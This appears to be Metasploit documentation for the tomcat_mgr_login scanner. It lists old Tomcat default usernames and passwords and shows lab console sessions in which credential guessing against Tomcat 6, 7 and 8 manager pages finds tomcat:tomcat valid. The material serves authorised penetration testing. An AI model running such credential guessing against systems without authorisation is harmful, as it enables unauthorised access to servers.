The `auxiliary/scanner/http/tomcat_mgr_login` works for Tomcat versions that uses HTTP
authentication.

Please note that for Tomcat 7 or newer, the roles required to use the manager application were
changed from the single `manager` role to the following four roles:

* manager-gui - Allows access to the HTML GUI and the status pages.
* manager-script - Allows access to the text interface and the status pages.
* manager-jmx - Allows access to the JMX and the status pages.
* manager-status - allows access to the status pages only.

Older versions of Tomcat came with default passwords enabled by default. For example:

**Tomcat 4**

| Username | Password | Role          |
| -------- | -------- | ------------- |
| tomcat   | tomcat   | tomcat        |
| role1    | tomcat   | role1         |
| both     | tomcat   | tomcat, role1 |

**Tomcat 5**

Same as Tomcat 4

Newer Tomcat versions have these passwords commented out.

If you are using the default Metasploit credential lists, these usernames and passwords are already
loaded.


## Vulnerable Application

To download the vulnerable application, you can find it here: https://tomcat.apache.org/whichversion.html.

## Verification Steps

1. Do: ```auxiliary/scanner/http/tomcat_mgr_login```
2. Do: ```set RHOSTS [IP]```
3. Set TARGETURI if necessary.
4. Do: ```run```

## Scenarios

All scenarios are run with the credentials tomcat/tomcat.

### Tomcat 6

Tomcat 6.0.48 running on Ubuntu 14.04

```
msf > use auxiliary/scanner/http/tomcat_mgr_login
msf auxiliary(tomcat_mgr_login) > set rport 8080
rport => 8080
msf auxiliary(tomcat_mgr_login) > set rhosts 192.168.2.156
rhosts => 192.168.2.156
msf auxiliary(tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 192.168.2.156:8080 - LOGIN FAILED: admin:admin (Incorrect)
```
...snip...

```
[-] 192.168.2.156:8080 - LOGIN FAILED: tomcat:root (Incorrect)
[+] 192.168.2.156:8080 - LOGIN SUCCESSFUL: tomcat:tomcat
[-] 192.168.2.156:8080 - LOGIN FAILED: both:admin (Incorrect)
```
...snip...

```
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Tomcat 7

Tomcat 7.0.68 running on Windows XP

```
msf > use auxiliary/scanner/http/tomcat_mgr_login
msf auxiliary(tomcat_mgr_login) > set rport 8087
rport => 8087
msf auxiliary(tomcat_mgr_login) > set rhosts 192.168.2.108
rhosts => 192.168.2.108
msf auxiliary(tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 192.168.2.108:8087 - LOGIN FAILED: admin:admin (Incorrect)
```

...snip...

```
[-] 192.168.2.108:8087 - LOGIN FAILED: tomcat:root (Incorrect)
[+] 192.168.2.108:8087 - LOGIN SUCCESSFUL: tomcat:tomcat
[-] 192.168.2.108:8087 - LOGIN FAILED: both:admin (Incorrect)
```

...snip...

```
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Tomcat 8

Tomcat 8.0.32 unning on Windows XP

```
msf > use auxiliary/scanner/http/tomcat_mgr_login
msf auxiliary(tomcat_mgr_login) > set rhosts 192.168.2.108
rhosts => 192.168.2.108
msf auxiliary(tomcat_mgr_login) > set rport 8088
rport => 8088
msf auxiliary(tomcat_mgr_login) > run

[!] No active DB -- Credential data will not be saved!
[-] 192.168.2.108:8088 - LOGIN FAILED: admin:admin (Incorrect)
```

...snip...

```
[-] 192.168.2.108:8088 - LOGIN FAILED: tomcat:root (Incorrect)
[+] 192.168.2.108:8088 - LOGIN SUCCESSFUL: tomcat:tomcat
[-] 192.168.2.108:8088 - LOGIN FAILED: both:admin (Incorrect)
```

...snip...

```
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
